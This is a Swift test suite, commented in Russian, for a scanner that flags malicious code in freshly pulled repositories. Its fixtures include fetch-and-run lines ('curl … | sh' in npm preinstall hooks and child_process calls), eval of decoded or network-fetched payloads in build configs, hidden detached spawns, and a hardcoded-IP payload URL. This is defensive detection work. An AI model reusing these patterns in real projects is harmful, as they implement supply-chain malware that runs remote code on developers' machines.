import Foundation
import Testing
@testable import RadarchikCore

/// Проверка кода после `git pull` / `git checkout` / `git clone` (SPEC §3б) —
/// замена codescan.sh. Что там было сломано и здесь проверено:
/// - 5 шаблонов из 22 обрезались на `|` и не работали вовсе, в том числе
///   главный — `eval(atob(…))`;
/// - `["\x27]` в grep — это не одинарная кавычка, и `require('child_process')`
///   не ловился;
/// - 296 «обфускаций» из 362 — зашифрованные `*.yml.enc` Rails, ложная тревога.
@Suite("Защита: проверка кода")
struct CodeScannerTests {
    private func threats(_ path: String, _ content: String) -> [CodeThreat] {
        CodeScanner.scan(path: path, content: content).map(\.threat)
    }

    // MARK: - Критическое

    @Test func evalOfDecodedPayloadIsCritical() {
        let findings = CodeScanner.scan(path: "src/index.js", content: "const a = 1;\neval(atob(\"Y29uc29sZS5sb2coMSk=\"));\n")
        #expect(findings.map(\.threat).contains(.evalDecoded))
        #expect(findings.first { $0.threat == .evalDecoded }?.line == 2)
        #expect(CodeThreat.evalDecoded.level == .critical)
        #expect(threats("lib/x.js", "eval(Buffer.from(p, 'base64').toString())").contains(.evalDecoded))
    }

    @Test func singleQuotedChildProcessExecIsCaught() {
        #expect(threats("lib/x.js", "require('child_process').exec('curl -s http://x | sh')").contains(.childProcessExec))
        #expect(threats("lib/x.js", "require(\"child_process\").execSync(cmd)").contains(.childProcessExec))
    }

    @Test func detachedSpawnAcrossLinesIsCritical() {
        let code = """
            const { spawn } = require('child_process');
            const child = spawn('node', ['payload.js'], {
              detached: true,
              windowsHide: true,
              stdio: 'ignore',
            });
            child.unref();
            """
        let found = threats("babel.helper.js", code)
        #expect(found.contains(.detachedSpawn))
        #expect(found.contains(.hiddenWindow))
    }

    @Test func sandboxEscapeAndCharCodeDecoders() {
        #expect(threats("a.js", "const g = Function('return this')();").contains(.sandboxEscape))
        #expect(threats("a.js", "new Function(String.fromCharCode(97,108,101,114,116))()").contains(.functionFromCharCode))
        #expect(threats("a.js", "const d = crypto.createDecipheriv(a,k,iv); let s = d.update(x); eval(s)").contains(.decryptEval))
    }

    @Test func configFilesMustNotRunCode() {
        let config = "module.exports = { presets: [] };\nrequire('https').get('https://x.example/p', r => r.on('data', d => eval(d)));\n"
        let found = CodeScanner.scan(path: "packages/app/babel.config.js", content: config)
        #expect(found.contains { $0.threat == .configLogic && $0.line == 2 })
        // Тот же код в обычном файле — не «логика в конфиге».
        #expect(!threats("src/loader.js", config).contains(.configLogic))
        #expect(threats("tailwind.config.js", "module.exports = { content: ['./app/**/*.erb'] }").isEmpty)
    }

    @Test func installScriptsThatDownloadOrEvalAreCritical() {
        let bad = """
            { "name": "x", "scripts": { "test": "jest", "postinstall": "node -e \\"require('child_process').exec('id')\\"" } }
            """
        #expect(threats("package.json", bad) == [.installScript])
        let curl = #"{ "scripts": { "preinstall": "curl -s https://x.example/i.sh | sh" } }"#
        #expect(threats("package.json", curl) == [.installScript])
        let fine = #"{ "scripts": { "postinstall": "husky install", "prepare": "npm run build" } }"#
        #expect(threats("package.json", fine).isEmpty)
        #expect(threats("package.json", "{ not json").isEmpty)
    }

    // MARK: - Стоит глянуть

    @Test func suspiciousButCommonThingsAreWarnings() {
        let found = CodeScanner.scan(path: "scripts/build.js", content: "const cp = require('child_process');\ncp.execSync('git rev-parse HEAD');\n")
        #expect(found.map(\.threat) == [.childProcess])
        #expect(found.allSatisfy { $0.threat.level == .warning })
    }

    @Test func hardcodedPublicIPIsSuspiciousButLocalIsNot() {
        #expect(threats("a.js", "fetch('http://185.12.4.7:1224/payload')").contains(.hardcodedIP))
        #expect(threats("a.js", "const api = 'http://127.0.0.1:3000/api'").isEmpty)
        #expect(threats("a.js", "const api = 'http://192.168.1.10:8080'").isEmpty)
        #expect(threats("a.js", "const api = 'http://10.0.0.5'").isEmpty)
    }

    @Test func blockchainDeadDropIsSuspicious() {
        let code = "const r = await fetch(`https://api.trongrid.io/v1/accounts/${a}/transactions?limit=1`)"
        #expect(threats("lib/net.js", code).contains(.blockchainDeadDrop))
    }

    @Test func cleanCodeHasNoFindings() {
        let code = """
            import { useState } from 'react';
            export function Counter() {
              const [count, setCount] = useState(0);
              return <button onClick={() => setCount(count + 1)}>{count}</button>;
            }
            """
        #expect(threats("app/javascript/Counter.jsx", code).isEmpty)
        #expect(threats("app/models/user.rb", "class User < ApplicationRecord\n  has_many :orders\nend\n").isEmpty)
    }

    @Test func eachThreatOncePerFile() {
        let code = "eval(a)\neval(b)\neval(c)\n"
        let found = CodeScanner.scan(path: "x.js", content: code)
        #expect(found.map(\.threat) == [.eval])
        #expect(found.first?.line == 1)
    }

    // MARK: - Что проверять

    @Test func skipsDataLockfilesVendorAndCiphertext() {
        for path in [
            "config/credentials/production.yml.enc", "yarn.lock", "package-lock.json", "Gemfile.lock", "pnpm-lock.yaml",
            "vendor/bundle/x.rb", "node_modules/a/index.js", "app/assets/jquery-3.6.3.min.js", "public/assets/application-1a2b.js",
            "public/packs/js/app.js", "dist/index.js", ".yarn/releases/yarn-4.3.1.cjs", "docs/README.md", "logo.png",
            "vendor/assets/vis-timeline.bundle.js", "fonts/Inter.woff2", "Sources/App/main.swift",
        ] {
            #expect(!CodeScanner.shouldScan(path), "не должен проверять \(path)")
        }
        for path in ["babel.config.js", "app/models/user.rb", "scripts/setup.sh", "package.json", "lib/tasks/x.rake", "src/main.ts", "tools/x.py"] {
            #expect(CodeScanner.shouldScan(path), "должен проверять \(path)")
        }
    }

    // MARK: - Обфускация

    private var obfuscated: String {
        let escapes = String(repeating: "\\x63\\x68\\x69\\x6c\\x64", count: 10)
        let blob = String(repeating: "QUJDREVGR0hJSktMTU5PUFFSU1RVVldY", count: 6)
        return "var _$_1e42=[\"\(escapes)\",\"\(blob)\"];\n" + String(repeating: "a+", count: 700) + "a;\n"
    }

    @Test func obfuscatedCodeIsCritical() {
        let score = CodeScanner.obfuscation(obfuscated)
        #expect(score.score >= 60)
        #expect(threats("lib/helper.js", obfuscated).contains(.obfuscated))
    }

    @Test func dataFilesAreNotObfuscation() {
        // Длинные строки и base64 в данных — норма: картинки, шифровки, локали.
        #expect(!threats("config/locales/en.json", obfuscated).contains(.obfuscated))
        #expect(!threats("app/views/a.svg", obfuscated).contains(.obfuscated))
    }

    @Test func dataURIsAreNotBase64Blobs() {
        let line = "const icon = \"data:image/png;base64,\(String(repeating: "iVBORw0KGgoAAAANSUhEUgAA", count: 8))\";"
        #expect(CodeScanner.obfuscation(line).score == 0)
    }

    @Test func ordinaryCodeScoresZero() {
        let code = (1...40).map { "  const value\($0) = compute(\($0), options);" }.joined(separator: "\n")
        #expect(CodeScanner.obfuscation(code).score == 0)
    }

    // MARK: - Итог

    @Test func reportPhrase() {
        let clean = CodeScanReport(repository: "/Users/me/work/storefront", trigger: .pull, filesChecked: 47, skipped: 3, findings: [])
        #expect(GuardPhrase.scan(clean) == "Проверил 47 файлов в storefront — чисто")
        let warning = CodeFinding(file: "scripts/build.js", line: 1, threat: .childProcess, excerpt: "require('child_process')")
        let critical = CodeFinding(file: "babel.config.js", line: 2, threat: .configLogic, excerpt: "eval(d)")
        let mixed = CodeScanReport(repository: "/Users/me/work/storefront", trigger: .pull, filesChecked: 12, skipped: 0, findings: [warning, critical])
        #expect(mixed.level == .critical)
        #expect(GuardPhrase.scan(mixed) == "В storefront после git pull — 1 опасное место. Не запускай код, пока не посмотришь")
        let soft = CodeScanReport(repository: "/Users/me/work/storefront", trigger: .checkout, filesChecked: 12, skipped: 0, findings: [warning])
        #expect(soft.level == .warning)
        #expect(GuardPhrase.scan(soft) == "Проверил 12 файлов в storefront — 1 место стоит глянуть")
        english {
            #expect(GuardPhrase.scan(clean) == "Checked 47 files in storefront — all clean")
        }
    }

    @Test func findingsOnOneLineAreShownOnce() {
        let config = "module.exports = {};\nrequire('https').get('https://185.12.4.7:1224/p', r => r.on('data', d => eval(d)));\n"
        let findings = CodeScanner.scan(path: "babel.config.js", content: config)
        let report = CodeScanReport(repository: "/w/app", trigger: .pull, filesChecked: 1, skipped: 0, findings: findings)
        // Логика в конфиге, eval и адрес по IP — одна строка, показываем её один раз.
        #expect(report.groups.count == 1)
        let group = report.groups[0]
        #expect(group.line == 2)
        #expect(group.level == .critical)
        #expect(group.threats.first == .configLogic)
        #expect(Set(group.threats) == [.configLogic, .eval, .hardcodedIP])
        #expect(GuardPhrase.group(group).hasPrefix("babel.config.js:2 — конфиг сборки ходит в сеть или запускает код, eval(), адрес сервера по IP · "))
    }

    @Test func excerptIsShortAndHasNoSecrets() throws {
        let line = "const key = 'sk-ant-api03-AbCdEf123456_xyz'; eval(atob(k)); " + String(repeating: "x", count: 300)
        let finding = try #require(CodeScanner.scan(path: "a.js", content: line).first { $0.threat == .evalDecoded })
        #expect(!finding.excerpt.contains("sk-ant-api03"))
        #expect(finding.excerpt.count <= 120)
    }
}
